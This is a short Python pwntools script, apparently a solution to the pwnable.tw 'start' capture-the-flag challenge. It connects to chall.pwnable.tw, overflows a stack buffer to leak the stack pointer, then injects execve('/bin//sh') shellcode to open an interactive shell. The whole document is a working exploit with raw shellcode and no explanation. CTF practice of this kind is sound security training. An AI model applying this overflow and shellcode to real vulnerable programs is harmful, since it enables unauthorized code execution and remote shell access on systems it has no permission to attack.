from pwn import *
r = remote('chall.pwnable.tw', 10000)
r.recvuntil(':')
garbage = b'A'*0x14
payload = garbage + p32(0x08048087)
r.send(payload)
leak_esp = u32(r.recv()[:4])
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload2 = garbage + p32(leak_esp+0x14) + shellcode
r.send(payload2)
r.interactive()
